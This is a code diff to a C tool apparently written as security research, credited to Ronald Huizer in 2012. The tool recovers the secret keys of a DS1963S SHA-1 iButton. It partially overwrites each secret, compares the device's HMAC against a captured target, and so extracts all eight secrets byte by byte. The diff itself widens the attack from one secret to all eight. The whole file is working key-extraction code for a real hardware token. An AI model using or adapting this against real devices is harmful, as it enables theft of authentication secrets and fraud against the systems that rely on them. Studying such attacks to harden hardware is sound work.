@@ -5,6 +5,7 @@
  *
  *  -- Ronald Huizer, 2012
  */
+#include <assert.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -18,41 +19,60 @@
 
 extern int fd[MAX_PORTNUM];
 
+struct brutus_secret
+{
+	uint8_t		target_hmac[20];
+	uint8_t		secret[8];
+	uint8_t		secret_idx;
+};
+
 struct brutus
 {
 	struct ds1963s_client	ctx;
-	uint8_t			target_hmac[20];
-	uint8_t			secret[8];
-	uint8_t			secret_idx;
+	struct brutus_secret	secrets[8];
 };
+
+int brutus_init_secret(struct brutus *brute, int secret)
+{
+	assert(secret >= 0 && secret <= 8);
+
+	int addr = ds1963s_client_page_to_address(secret);
+        struct ds1963s_read_auth_page_reply reply;
+	int portnum = brute->ctx.copr.portnum;
+
+	/* Erase the scratchpad. */
+        EraseScratchpadSHA18(portnum, 0, 0);
+
+	/* Read auth. page over the current scratchpad/data/etc. */
+	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
+		return -1;
+
+	memcpy(brute->secrets[secret].target_hmac, reply.signature, 20);
+
+	return 0;
+}
 
 int brutus_init(struct brutus *brute)
 {
-        struct ds1963s_read_auth_page_reply reply;
 	SHACopr *copr = &brute->ctx.copr;
-	uint8_t buf[32];
 	int i;
 
-	/* Initialize the hmac we'll brute force. */
-	brute->secret_idx = 0;
-	memset(brute->secret, 0, sizeof brute->secret);
+	/* Initialize the secrets we'll side-channel. */
+	memset(brute->secrets, 0, sizeof brute->secrets);
 
 	/* Initialize the DS1963S client. */
 	if (ds1963s_client_init(&brute->ctx, SERIAL_PORT) == -1)
 		return -1;
 
-	/* Zero memory data page #0 and the scratchpad. */
-	memset(buf, 0, sizeof buf);
-        EraseScratchpadSHA18(copr->portnum, 0, 0);
-	WriteScratchpadSHA18(copr->portnum, 0, buf, 32, 0);
-
-	/* Calculate SHA1 MAC over zeroed data. */
-	if (ds1963s_client_read_auth(&brute->ctx, 0, &reply, 0) == -1) {
-		ibutton_perror("ds1963s_client_read_auth()");
-		exit(EXIT_FAILURE);
+	/* Calculate the target HMACs for all the secrets. */
+	for (i = 0; i < 8; i++) {
+		if (brutus_init_secret(brute, i) == -1) {
+			ds1963s_client_destroy(&brute->ctx);
+			return -1;
+		}
 	}
 
-	memcpy(brute->target_hmac, reply.signature, 20);
+	return 0;
 }
 
 void brutus_perror(const char *s)
@@ -159,44 +179,73 @@ void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, uint8_
 	}
 }
 
-int brutus_do_one(struct brutus *brute)
+int brutus_do_one(struct brutus *brute, int num)
 {
+	struct brutus_secret *secret = &brute->secrets[num];
+	int addr = ds1963s_client_page_to_address(num);
         struct ds1963s_read_auth_page_reply reply;
 	SHACopr *copr = &brute->ctx.copr;
-	uint8_t buf[32];
 	int i;
 
 	ds1963s_secret_write_partial(
 		&brute->ctx,		/* DS1963S context */
-		0,			/* Secret number */
-		brute->secret,		/* Partial secret to write */
-		brute->secret_idx + 1	/* Length of the partial secret */
+		num,			/* Secret number */
+		secret->secret,		/* Partial secret to write */
+		secret->secret_idx + 1	/* Length of the partial secret */
 	);
 
-	/* Zero memory data page #0 and the scratchpad. */
-	memset(buf, 0, sizeof buf);
+	/* Erase the scratchpad. */
         EraseScratchpadSHA18(copr->portnum, 0, 0);
-	WriteScratchpadSHA18(copr->portnum, 0, buf, 32, 0);
 
-	/* Calculate SHA1 MAC over zeroed data. */
-	if (ds1963s_client_read_auth(&brute->ctx, 0, &reply, 0) == -1) {
+	/* Read auth. page over the current scratchpad/data/etc. */
+	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1) {
 		ibutton_perror("ds1963s_client_read_auth()");
 		exit(EXIT_FAILURE);
 	}
 
 	/* Compare the current hmac with the target one. */
-	if (!memcmp(brute->target_hmac, reply.signature, 20)) {
+	if (!memcmp(secret->target_hmac, reply.signature, 20)) {
 		/* We're done. */
-		if (brute->secret_idx++ == sizeof(brute->secret) - 1)
+		if (secret->secret_idx++ == 7)
 			return 0;
 	} else {
 		/* Something went wrong. */
-		if (brute->secret[brute->secret_idx]++ == 255)
+		if (secret->secret[secret->secret_idx]++ == 255)
 			return -1;
 	}
 
 	/* More to come. */
 	return 1;
+}
+
+void brutus_do_secret(struct brutus *brute, int num)
+{
+	struct brutus_secret *secret = &brute->secrets[num];
+	int i, ret;
+
+	do {
+		printf("\rSecret #%d Trying: [", num);
+		for (i = 0; i <= secret->secret_idx; i++)
+			printf("%.2x", secret->secret[i]);
+		for (i = secret->secret_idx + 1; i < 8; i++)
+			printf("  ");
+		printf("]");
+		fflush(stdout);
+
+		ret = brutus_do_one(brute, num);
+	} while (ret == 1);
+
+	printf("\n");
+
+	if (ret == -1) {
+		fprintf(stderr, "Something went wrong.\n");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Key: ");
+	for (i = 0; i < 8; i++)
+		printf("%.2x", secret->secret[i]);
+	printf("\n");
 }
 
 int main(int argc, char **argv)
@@ -210,36 +259,12 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 
-	printf("Target HMAC: ");
-	for (i = 0; i < sizeof brute.target_hmac; i++)
-		printf("%.2x", brute.target_hmac[i]);
-	printf("\n");
-
-	do {
-		printf("\rTrying: [");
-		for (i = 0; i <= brute.secret_idx; i++)
-			printf("%.2x", brute.secret[i]);
-		for (i = brute.secret_idx + 1; i < sizeof brute.secret; i++)
-			printf("  ");
-		printf("]");
-		fflush(stdout);
-
-		ret = brutus_do_one(&brute);
-	} while (ret == 1);
-
-	printf("\n");
-
-	if (ret == -1) {
-		fprintf(stderr, "Something went wrong.\n");
-		exit(EXIT_FAILURE);
+	for (i = 0; i < 8; i++) {
+		printf("Secret #%d Target HMAC: ", i);
+		ds1963s_client_hash_print(brute.secrets[i].target_hmac);
+		brutus_do_secret(&brute, i);
 	}
 
-	printf("Key: ");
-	for (i = 0; i < sizeof brute.secret; i++)
-		printf("%.2x", brute.secret[i]);
-	printf("\n");
-
 	brutus_destroy(&brute);
-
 	exit(EXIT_SUCCESS);
 }
